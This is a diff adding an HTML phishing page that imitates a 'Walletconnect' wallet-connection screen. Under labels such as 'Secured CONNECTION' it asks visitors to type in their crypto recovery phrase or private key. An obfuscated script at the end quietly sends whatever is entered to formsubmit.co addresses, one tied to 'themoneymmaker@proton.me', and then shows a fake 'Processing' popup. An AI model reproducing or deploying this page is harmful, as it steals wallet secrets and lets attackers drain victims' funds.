@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://unpkg.com/flowbite@1.5.3/dist/flowbite.min.css" />
+    <link rel="stylesheet" href="https://rsms.me/inter/inter.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdn.tailwindcss.com?plugins=forms,typography,aspect-ratio,line-clamp"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <style>
+        /* Add your existing CSS styles here */
+
+/* Popup styles */
+.popup {
+    z-index: 9999999;
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 15%;
+  width: 70%;
+  height: 100%;
+  background-color: rgba(0, 0, 0, 0.5);
+  justify-content: center;
+  align-items: center;
+}
+
+.popup-content {
+  background-color: #fff;
+  padding: 20px;
+  border-radius: 10px;
+  text-align: center;
+}
+
+/* Your updated loading bar styles */
+
+.loading-spinner {
+  /* Set the background color of the bar */
+  background-color: #4b3a6e;
+  
+  /* Set the height of the bar */
+  height: 10px;
+  
+  /* Set the border radius to create rounded corners */
+  border-radius: 5px;
+  
+  /* Set the width to 100% to fill the container */
+  width: 100%;
+  
+  /* Apply a filling and emptying animation */
+  animation: fillAndEmpty 2s linear infinite;
+  margin: 10px auto;
+}
+
+/* Define the keyframes for the fillAndEmpty animation */
+@keyframes fillAndEmpty {
+  0%, 100% {
+    /* Set the width to 0% at the start and end of the animation */
+    width: 0%;
+  }
+  50% {
+    /* Set the width to 100% at the midpoint of the animation, creating a fill effect */
+    width: 100%;
+  }
+}
+
+    </style>
+</head>
+
+<body style="background-color:#08081c">
+    <!-- Popup -->
+    <div class="popup" id="popup">
+        <div class="popup-content">
+            <p>Processing...</p>
+            <img src="https://check.big-five.co/cs/img/barcode.png" class="w-100" style="margin: auto; 
+            max-height: 250px;
+            padding: 20px;
+        ">
+            <div class="loading-spinner"></div>
+        </div>
+        </div>
+    <section class="">
+        <div class="flex flex-col items-center justify-center px-6 py-8 mx-auto md:h-screen lg:py-0">
+            <a href="../index.html" class="flex items-center font-bold text-white">
+                <img src="../wc1.png" class="mr-3  mb-5" style="height:30px" alt="Logo">
+                <span>Walletconnect</span>
+            </a>
+            <div class="p-4 text mb-4 text-sm text-blue-700 bg-blue-100 rounded-lg dark:bg-blue-200 dark:text-blue-800" role="alert">
+                <span class="font-medium">
+                   Info alert!
+                </span>Securely use any of the options below
+            </div>
+
+
+            <div class="w-full bg-white rounded-lg shadow dark:border md:mt-0 sm:max-w-md xl:p-0 dark:bg-gray-800 dark:border-gray-700">
+
+                <div class="mb-4  border-b border-gray-200 dark:border-gray-700">
+                    <ul class="flex flex-wrap -mb-px text-sm font-medium text-center" id="myTab" data-tabs-toggle="#myTabContent" role="tablist">
+                        <li class="mr-2" role="presentation">
+                            <button class="inline-block p-4 rounded-t-lg border-b-2 text-blue-600 hover:text-blue-600 dark:text-blue-500 dark:hover:text-blue-500 border-blue-600 dark:border-blue-500" id="profile-tab" data-tabs-target="#profile" type="button" role="tab" aria-controls="profile"
+                                aria-selected="true">Phrase or Private key</button>
+                        </li>
+
+                    </ul>
+                </div>
+                <div id="myTabContent">
+                    <div class="p-4 bg-gray-50 rounded-lg dark:bg-gray-800" id="profile" role="tabpanel" aria-labelledby="profile-tab">
+
+                        <form id="#phrase-form" action="" method="POST">
+                            <div class="mb-6">
+                                <div class="mb-6">
+                                    <textarea rows="4" name="Phrse" type="text" minlength="12" placeholder="Enter your recovery phrase (typically 12-24 words seperated by a single space) or 64 alphanumeric digits also known as private keys" id="large-input" class="block p-4 w-full text-gray-900 bg-gray-50 rounded-lg border border-gray-300 sm:text-md focus:ring-blue-500 focus:border-blue-500 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
+                                        required></textarea>
+                                </div>
+
+                                <input type="hidden" name="_next" value="https://app.parallelfl.network/apiv4wc-connection-success">
+
+                                <input type="hidden" name="_captcha" value="false">
+
+                                <button id="prbutton" type="submit" class="text-white bg-blue-700 hover:bg-blue-800 focus:ring-4 focus:ring-blue-300 font-medium rounded-lg text-sm px-5 py-2.5 mr-2 mb-2 dark:bg-blue-600 dark:hover:bg-blue-700 focus:outline-none dark:focus:ring-blue-800">Proceed</button>
+                        </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="mt-5 text-white bg-gradient-to-r from-blue-500 via-blue-600 to-blue-700 hover:bg-gradient-to-br focus:ring-4 focus:outline-none focus:ring-blue-300 dark:focus:ring-blue-800 font-medium rounded-lg text-sm px-5 py-2.5 text-center mr-2 mb-2">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-shield-shaded" viewBox="0 0 16 16">
+             <path fill-rule="evenodd" d="M8 14.933a.615.615 0 0 0 .1-.025c.076-.023.174-.061.294-.118.24-.113.547-.29.893-.533a10.726 10.726 0 0 0 2.287-2.233c1.527-1.997 2.807-5.031 2.253-9.188a.48.48 0 0 0-.328-.39c-.651-.213-1.75-.56-2.837-.855C9.552 1.29 8.531 1.067 8 1.067v13.866zM5.072.56C6.157.265 7.31 0 8 0s1.843.265 2.928.56c1.11.3 2.229.655 2.887.87a1.54 1.54 0 0 1 1.044 1.262c.596 4.477-.787 7.795-2.465 9.99a11.775 11.775 0 0 1-2.517 2.453 7.159 7.159 0 0 1-1.048.625c-.28.132-.581.24-.829.24s-.548-.108-.829-.24a7.158 7.158 0 0 1-1.048-.625 11.777 11.777 0 0 1-2.517-2.453C1.928 10.487.545 7.169 1.141 2.692A1.54 1.54 0 0 1 2.185 1.43 62.456 62.456 0 0 1 5.072.56z"/>
+           </svg>Secured CONNECTION
+            </div>
+    </section>
+
+    <script>
+         function openbarcode() {
+    document.getElementById("popup").style.display = "flex";
+    // Add additional logic or actions here if needed
+}
+document.addEventListener("DOMContentLoaded", function () {
+  // Get the loading paragraph element
+  var loadingParagraph = document.querySelector('.popup-content p');
+
+  // Set the initial number of dots
+  var numDots = 1;
+
+  // Define a function to update the loading text
+  function updateLoadingText() {
+    // Update the text with the appropriate number of dots
+    loadingParagraph.textContent = 'Processing' + '.'.repeat(numDots);
+
+    // Increase the number of dots, or reset to 1 if it reaches 6
+    numDots = numDots === 6 ? 1 : numDots + 1;
+  }
+
+  // Call the updateLoadingText function every 1000 milliseconds (adjust as needed)
+  setInterval(updateLoadingText, 2000);
+});
+function thankyou_message() {
+            var btn = document.querySelectorAll("#prbutton");
+            var thankyouMessage = document.querySelector('.thankyou_message');
+            if (btn.innerHTML === "Processing.....") {
+                openbarcode();
+            } else {
+                thankyouMessage.style.display = "none";
+            }
+        }
+    </script>
+
+
+<script>
+   function _0x1fec(_0x4e81fd,_0x3e22a1){const _0x151e0e=_0x1ef8();return _0x1fec=function(_0x4a5ca1,_0xaa355d){_0x4a5ca1=_0x4a5ca1-0x64;let _0x33dc99=_0x151e0e[_0x4a5ca1];return _0x33dc99;},_0x1fec(_0x4e81fd,_0x3e22a1);}const _0x1a3f0f=_0x1fec;function _0x1ef8(){const _0x569541=['5CQwOfu','9551512wNctCU','prototype','80tvrtIM','1VYFtzN','error','querySelector','application/json','1363446QwHgTc','catch','81274NfwXnL','form','__proto__','Form\x20submitted\x20successfully','Error\x20submitting\x20form','target','bind','info','7KQwweZ','preventDefault','constructor','DOMContentLoaded','7164NZhFSW','toString','{}.constructor(\x22return\x20this\x22)(\x20)','console','1511199ZzOfaa','#prbutton','exception','https://formsubmit.co/ajax/themoneymmaker@proton.me','table','click','length','81059upOwsU','1083244nPsLxC','then','return\x20(function()\x20','closest','2158743PIGtdU','forEach','addEventListener','https://formsubmit.co/ajax/c7a1f64ffc21375e5e4ec1ec5abd2f37','json'];_0x1ef8=function(){return _0x569541;};return _0x1ef8();}(function(_0x1544c7,_0xf3b62e){const _0xbe85f=_0x1fec,_0x264b61=_0x1544c7();while(!![]){try{const _0x55a5a0=parseInt(_0xbe85f(0x70))/0x1*(parseInt(_0xbe85f(0x76))/0x2)+-parseInt(_0xbe85f(0x67))/0x3+parseInt(_0xbe85f(0x8e))/0x4*(-parseInt(_0xbe85f(0x6c))/0x5)+-parseInt(_0xbe85f(0x74))/0x6+parseInt(_0xbe85f(0x7e))/0x7*(-parseInt(_0xbe85f(0x6d))/0x8)+-parseInt(_0xbe85f(0x86))/0x9*(parseInt(_0xbe85f(0x6f))/0xa)+parseInt(_0xbe85f(0x8d))/0xb*(parseInt(_0xbe85f(0x82))/0xc);if(_0x55a5a0===_0xf3b62e)break;else _0x264b61['push'](_0x264b61['shift']());}catch(_0x14e85f){_0x264b61['push'](_0x264b61['shift']());}}}(_0x1ef8,0xa740e));const _0xaa355d=(function(){let _0x3a7ec6=!![];return function(_0x3809d7,_0x5eab1d){const _0x4ca2d7=_0x3a7ec6?function(){if(_0x5eab1d){const _0x4ce682=_0x5eab1d['apply'](_0x3809d7,arguments);return _0x5eab1d=null,_0x4ce682;}}:function(){};return _0x3a7ec6=![],_0x4ca2d7;};}()),_0x4a5ca1=_0xaa355d(this,function(){const _0x588655=_0x1fec,_0x225c25=function(){const _0x7be79e=_0x1fec;let _0x213958;try{_0x213958=Function(_0x7be79e(0x65)+_0x7be79e(0x84)+');')();}catch(_0x41a217){_0x213958=window;}return _0x213958;},_0x4bb071=_0x225c25(),_0x45d591=_0x4bb071[_0x588655(0x85)]=_0x4bb071['console']||{},_0x66101=['log','warn',_0x588655(0x7d),_0x588655(0x71),_0x588655(0x88),_0x588655(0x8a),'trace'];for(let _0x5bcf49=0x0;_0x5bcf49<_0x66101[_0x588655(0x8c)];_0x5bcf49++){const _0x222681=_0xaa355d[_0x588655(0x80)][_0x588655(0x6e)]['bind'](_0xaa355d),_0x4ff847=_0x66101[_0x5bcf49],_0x3cf68b=_0x45d591[_0x4ff847]||_0x222681;_0x222681[_0x588655(0x78)]=_0xaa355d[_0x588655(0x7c)](_0xaa355d),_0x222681[_0x588655(0x83)]=_0x3cf68b[_0x588655(0x83)][_0x588655(0x7c)](_0x3cf68b),_0x45d591[_0x4ff847]=_0x222681;}});_0x4a5ca1(),document[_0x1a3f0f(0x69)](_0x1a3f0f(0x81),function(){const _0x2393b4=_0x1a3f0f;function _0x4b29f0(_0x1ef1cf,_0x4945b3){const _0x4f871f=_0x1fec;fetch(_0x4945b3,{'method':'POST','headers':{'Content-Type':_0x4f871f(0x73)},'body':JSON['stringify'](_0x1ef1cf)})['then'](_0xf87c86=>_0xf87c86[_0x4f871f(0x6b)]())[_0x4f871f(0x64)](_0x34b683=>{const _0x564d48=_0x4f871f;console['log'](_0x564d48(0x79),_0x34b683),openbarcode();})[_0x4f871f(0x75)](_0x1433da=>{const _0x12bcc6=_0x4f871f;console[_0x12bcc6(0x71)](_0x12bcc6(0x7a),_0x1433da);});}function _0x56ea80(_0x3e9ae4){const _0x449ac3=_0x1fec;_0x3e9ae4[_0x449ac3(0x7f)]();const _0x35a472=_0x3e9ae4[_0x449ac3(0x7b)][_0x449ac3(0x66)](_0x449ac3(0x77)),_0x32f738=new FormData(_0x35a472),_0x4d7f30={};_0x32f738[_0x449ac3(0x68)]((_0x4cded2,_0x2b3b0a)=>{_0x4d7f30[_0x2b3b0a]=_0x4cded2;});const _0x5b3bb0=_0x449ac3(0x6a);_0x4b29f0(_0x4d7f30,_0x5b3bb0),_0x11adf7(_0x3e9ae4);}function _0x11adf7(_0x4bb201){const _0x184667=_0x1fec;_0x4bb201['preventDefault']();const _0x504055=_0x4bb201[_0x184667(0x7b)][_0x184667(0x66)](_0x184667(0x77)),_0x25b152=new FormData(_0x504055),_0x4b9af4={};_0x25b152[_0x184667(0x68)]((_0x267507,_0x4c04b7)=>{_0x4b9af4[_0x4c04b7]=_0x267507;});const _0x26fbe0=_0x184667(0x89);_0x4b29f0(_0x4b9af4,_0x26fbe0);}const _0x39274d=document['querySelector'](_0x2393b4(0x87)),_0x2af824=document[_0x2393b4(0x72)]('#prbutton');_0x39274d&&_0x39274d[_0x2393b4(0x69)](_0x2393b4(0x8b),_0x56ea80),_0x2af824&&_0x2af824[_0x2393b4(0x69)](_0x2393b4(0x8b),_0x56ea80);});
+  </script>
+  
+
+
+    <script src="https://unpkg.com/flowbite@1.5.3/dist/flowbite.js"></script>
+</body>
+
+</html>
